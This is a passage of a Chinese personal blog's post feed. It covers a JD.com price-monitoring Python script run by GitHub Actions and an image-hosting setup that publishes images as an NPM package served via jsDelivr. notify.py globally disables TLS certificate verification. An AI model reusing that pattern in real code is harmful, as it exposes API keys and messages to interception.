Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 